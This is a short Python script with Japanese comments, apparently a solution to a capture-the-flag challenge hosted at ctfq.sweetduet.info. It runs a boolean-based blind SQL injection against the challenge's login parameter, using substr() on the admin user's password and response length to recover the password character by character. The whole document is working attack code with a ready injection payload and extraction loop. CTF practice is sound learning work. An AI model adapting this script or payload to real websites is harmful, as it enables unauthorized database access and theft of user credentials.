import urllib.request, urllib.parse

data = {
    "id": "' OR substr((SELECT pass FROM user WHERE id='admin'),"
}

#passの何文字目を抽出するか（substr()の第二引数
n = "1"
tmp2=",1)  = "
q1 = "'"
#抽出したpass（一文字）と一致するか調べる。A-Z, a-z, _, 0-9 まで合計63回まわす
query = "A"
q2 = "'"
comment = "--"
answer = ""

#パラメータをセット
tmp = data["id"]
data["id"] = tmp+n+tmp2+q1+query+q2+comment
data3 = urllib.parse.urlencode(data).encode("utf-8")

#プログラム作成前にlength関数を挿入して、passの長さが21文字であることがわかっている
for i in range(21):
    for j in range(63):
        res = urllib.request.urlopen("http://ctfq.sweetduet.info:10080/~q6/", data3)
        
        #OR以降のSQL文（substr ~)が正しいとき
        if int(res.headers['content-length']) > 1000:
            answer = answer + query
            n = str(int(n)+1)
            print(n)
            query = "A"
            data["id"] = tmp+n+tmp2+q1+query+q2+comment
            data3 = urllib.parse.urlencode(data).encode("utf-8")
            break
        
        if query=="Z":
            query = "a"
        elif query=="z":
            query = "_"
        elif query== "_":
            query = "0"
        else:    
            query = chr(ord(query)+1)
        
        
        data["id"] = tmp+n+tmp2+q1+query+q2+comment
        data3 = urllib.parse.urlencode(data).encode("utf-8")

#FLAGを表示
print(answer)
